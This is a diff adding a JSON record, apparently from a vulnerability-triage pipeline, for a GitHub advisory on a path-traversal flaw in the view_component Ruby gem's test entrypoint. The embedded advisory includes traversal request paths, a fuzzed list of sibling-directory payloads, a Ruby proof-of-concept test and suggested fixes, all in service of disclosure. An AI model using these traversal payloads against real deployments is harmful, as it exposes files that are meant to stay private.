@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/216992819?v=4\", \"events_url\": \"https://api.github.com/users/cyberlanc3r/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/cyberlanc3r/followers\", \"following_url\": \"https://api.github.com/users/cyberlanc3r/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/cyberlanc3r/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/cyberlanc3r\", \"id\": 216992819, \"login\": \"cyberlanc3r\", \"node_id\": \"U_kgDODO8MMw\", \"organizations_url\": \"https://api.github.com/users/cyberlanc3r/orgs\", \"received_events_url\": \"https://api.github.com/users/cyberlanc3r/received_events\", \"repos_url\": \"https://api.github.com/users/cyberlanc3r/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/cyberlanc3r/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/cyberlanc3r/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/cyberlanc3r\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44837\", \"cvss\": {\"score\": 5.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-187\", \"name\": \"Partial String Comparison\"}], \"description\": \"### Summary\\n\\nThe system test entrypoint canonicalizes a user-controlled file path with `File.realpath`, then checks whether the resolved path starts with the temp directory path. This is not a safe containment check because sibling directories can share the same string prefix.\\n\\nSeverity: Medium; test-route scoped.\\n\\nExample:\\n\\n```text\\nAllowed base:  /app/tmp/view_components\\nOutside path:  /app/tmp/view_components_evil/secret.html.erb\\n```\\n\\nThe outside path is not inside the base directory, but it passes:\\n\\n```ruby\\n@path.start_with?(base_path)\\n```\\n\\n### Relevant Code\\n\\n`app/controllers/view_components_system_test_controller.rb`:\\n\\n```ruby\\nbase_path = ::File.realpath(self.class.temp_dir)\\n@path = ::File.realpath(params.permit(:file)[:file], base_path)\\nraise ViewComponent::SystemTestControllerNefariousPathError unless @path.start_with?(base_path)\\n```\\n\\nThe route then renders the resolved file:\\n\\n```ruby\\nrender file: @path\\n```\\n\\n### Exploit Flow\\n\\nExample request:\\n\\n```text\\nGET /_system_test_entrypoint?file=../view_components_evil/secret.html.erb\\n```\\n\\nFlow:\\n\\n1. `base_path` resolves to `.../tmp/view_components`.\\n2. The payload resolves to `.../tmp/view_components_evil/secret.html.erb`.\\n3. That path is outside the intended temp directory.\\n4. The string prefix check still passes.\\n5. Rails renders the sibling file.\\n\\nThe route is mounted only in `Rails.env.test?`, which is why Medium is more appropriate than P1. The issue matters if test routes are reachable in shared CI, staging, review apps, or any accidentally exposed test-mode deployment.\\n\\n### Targeted Fuzz Result\\n\\nThe following sibling paths passed an equivalent `realpath` plus `start_with?` harness while resolving outside the base directory:\\n\\n```text\\n../view_components_evil/secret.html\\n../view_components2/poc.html\\n../view_components.bak/poc.html\\n../view_components-old/poc.html\\n../view_componentsx/poc.html\\n```\\n\\n### PoC Test\\n\\nCreate `test/sandbox/test/system_test_entrypoint_path_traversal_poc_test.rb`:\\n\\n```ruby\\n# frozen_string_literal: true\\n\\nrequire \\\"test_helper\\\"\\nrequire \\\"fileutils\\\"\\n\\nclass SystemTestEntrypointPathTraversalPocTest < ActionDispatch::IntegrationTest\\n  def test_system_test_entrypoint_allows_sibling_directory_with_same_prefix\\n    base_dir = File.realpath(ViewComponentsSystemTestController.temp_dir)\\n    parent_dir = File.dirname(base_dir)\\n    sibling_dir = File.join(parent_dir, \\\"#{File.basename(base_dir)}_evil\\\")\\n    outside_file = File.join(sibling_dir, \\\"secret.html.erb\\\")\\n\\n    FileUtils.mkdir_p(sibling_dir)\\n    File.write(outside_file, \\\"<div>VC_SYSTEM_TEST_TRAVERSAL_POC</div>\\\")\\n\\n    get \\\"/_system_test_entrypoint\\\", params: {\\n      file: \\\"../#{File.basename(base_dir)}_evil/secret.html.erb\\\"\\n    }\\n\\n    assert_response :success\\n    assert_includes response.body, \\\"VC_SYSTEM_TEST_TRAVERSAL_POC\\\"\\n  ensure\\n    FileUtils.rm_f(outside_file) if defined?(outside_file) && outside_file\\n    Dir.rmdir(sibling_dir) if defined?(sibling_dir) && sibling_dir && Dir.exist?(sibling_dir)\\n  end\\nend\\n```\\n\\nRun:\\n\\n```bash\\nbundle exec ruby -Itest test/sandbox/test/system_test_entrypoint_path_traversal_poc_test.rb\\n```\\n\\nVulnerable behavior: the response succeeds and contains `VC_SYSTEM_TEST_TRAVERSAL_POC`.\\n\\nFixed behavior: the request raises `ViewComponent::SystemTestControllerNefariousPathError` or otherwise fails without rendering the file.\\n\\n### Suggested Fix\\n\\nUse path-aware containment instead of a raw string prefix. For example:\\n\\n```ruby\\ndef validate_file_path\\n  base_path = Pathname.new(::File.realpath(self.class.temp_dir))\\n  path = Pathname.new(::File.realpath(params.permit(:file)[:file], base_path.to_s))\\n  relative_path = path.relative_path_from(base_path)\\n\\n  raise ViewComponent::SystemTestControllerNefariousPathError if relative_path.each_filename.first == \\\"..\\\"\\n\\n  @path = path.to_s\\nend\\n```\\n\\nOr require a separator boundary:\\n\\n```ruby\\nallowed_prefix = \\\"#{base_path}#{File::SEPARATOR}\\\"\\nunless @path == base_path || @path.start_with?(allowed_prefix)\\n  raise ViewComponent::SystemTestControllerNefariousPathError\\nend\\n```\\n\\nAdd regression tests for:\\n\\n- A normal temp file inside `tmp/view_components`\\n- `../../README.md`\\n- `../view_components_evil/secret.html.erb`\\n- A symlink inside the temp directory that resolves outside it\", \"epss\": {\"percentage\": 0.00412, \"percentile\": 0.32779}, \"ghsa_id\": \"GHSA-hg3h-g7xc-f7vp\", \"github_reviewed_at\": \"2026-05-08T23:33:58Z\", \"html_url\": \"https://github.com/advisories/GHSA-hg3h-g7xc-f7vp\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hg3h-g7xc-f7vp\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44837\"}], \"nvd_published_at\": \"2026-05-26T21:16:38Z\", \"published_at\": \"2026-05-08T23:33:58Z\", \"references\": [\"https://github.com/ViewComponent/view_component/security/advisories/GHSA-hg3h-g7xc-f7vp\", \"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/view_component/CVE-2026-44837.yml\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44837\", \"https://github.com/advisories/GHSA-hg3h-g7xc-f7vp\"], \"repository_advisory_url\": \"https://api.github.com/repos/ViewComponent/view_component/security-advisories/GHSA-hg3h-g7xc-f7vp\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/ViewComponent/view_component\", \"summary\": \"view_component: System Test Entry Point Path Check Allows Sibling Directory Escape\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:34:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-hg3h-g7xc-f7vp\", \"vulnerabilities\": [{\"first_patched_version\": \"4.9.0\", \"package\": {\"ecosystem\": \"rubygems\", \"name\": \"view_component\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.0.0, < 4.9.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hg3h-g7xc-f7vp",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "view_component: >= 3.0.0, < 4.9.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-44837"
+    ],
+    "cvss_score": 5.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "view_component"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.140274Z",
+  "provenance": {
+    "content_sha256": "8809e519d3623463fd955303d10c147add6b61bc470b8b1b942869feac20c9bf",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-08T23:33:58Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hg3h-g7xc-f7vp",
+  "status": "active",
+  "title": "view_component: System Test Entry Point Path Check Allows Sibling Directory Escape",
+  "updated_at": "2026-06-08T23:34:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hg3h-g7xc-f7vp"
+}
